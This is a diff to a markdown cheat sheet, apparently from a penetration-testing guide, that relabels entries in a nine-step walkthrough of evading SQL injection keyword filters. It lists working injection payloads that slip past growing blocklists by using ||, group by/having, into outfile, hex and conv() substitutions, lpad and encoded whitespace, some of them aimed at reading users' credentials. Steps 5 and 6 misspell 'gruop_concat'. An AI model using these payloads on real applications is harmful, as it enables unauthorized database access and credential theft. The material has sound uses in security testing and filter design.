@@ -1518,50 +1518,50 @@ __Example__: SQL Injection
 
 ##### • Step 1:
 __Keywords Filtered__: `and`, `or`, `union`  
-- __Filtered Injection__: `union select user, password from users`
+- __Blocked Attempt__: `union select user, password from users`
 - __Bypassed Injection__: `1 || (select user from users where user_id = 1) = 'admin'`
 
 ##### • Step 2:
 __Keywords Filtered__: `and`, `or`, `union`, `where`  
-- __Filtered Injection__: `1 || (select user from users where user_id = 1) = 'admin'`
+- __Blocked Attempt__: `1 || (select user from users where user_id = 1) = 'admin'`
 - __Bypassed Injection__: `1 || (select user from users limit 1) = 'admin'`
 
 ##### • Step 3:
 __Keywords Filtered__: `and`, `or`, `union`, `where`, `limit`  
-- __Filtered Injection__: `1 || (select user from users limit 1) = 'admin'`
+- __Blocked Attempt__: `1 || (select user from users limit 1) = 'admin'`
 - __Bypassed Injection__: `1 || (select user from users group by user_id having user_id = 1) = 'admin'`
 
 ##### • Step 4:
 __Keywords Filtered__: `and`, `or`, `union`, `where`, `limit`, `group by`  
-- __Filtered Injection__: `1 || (select user from users group by user_id having user_id = 1) = 'admin'`
+- __Blocked Attempt__: `1 || (select user from users group by user_id having user_id = 1) = 'admin'`
 - __Bypassed Injection__: `1 || (select substr(group_concat(user_id),1,1) user from users ) = 1`
 
 ##### • Step 5:
 __Keywords Filtered__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`  
-- __Filtered Injection__: `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
+- __Blocked Attempt__: `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
 - __Bypassed Injection__: `1 || 1 = 1 into outfile 'result.txt'`
 - __Bypassed Injection__: `1 || substr(user,1,1) = 'a'`
 
 ##### • Step 6:
 __Keywords Filtered__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`  
-- __Filtered Injection__: `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
+- __Blocked Attempt__: `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
 - __Bypassed Injection__: `1 || user_id is not null`
 - __Bypassed Injection__: `1 || substr(user,1,1) = 0x61`
 - __Bypassed Injection__: `1 || substr(user,1,1) = unhex(61)`
 
 ##### • Step 7:
 __Keywords Filtered__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`  
-- __Filtered Injection__: `1 || substr(user,1,1) = unhex(61)`
+- __Blocked Attempt__: `1 || substr(user,1,1) = unhex(61)`
 - __Bypassed Injection__: `1 || substr(user,1,1) = lower(conv(11,10,36))`
 
 ##### • Step 8:
 __Keywords Filtered__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`, `substr`  
-- __Filtered Injection__: `1 || substr(user,1,1) = lower(conv(11,10,36))`
+- __Blocked Attempt__: `1 || substr(user,1,1) = lower(conv(11,10,36))`
 - __Bypassed Injection__: `1 || lpad(user,7,1)`
 
 ##### • Step 9:
 __Keywords Filtered__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`, `substr`, `white space`  
-- __Filtered Injection__: `1 || lpad(user,7,1)`
+- __Blocked Attempt__: `1 || lpad(user,7,1)`
 - __Bypassed Injection__: `1%0b||%0blpad(user,7,1)`
 
 ### Obfuscation:
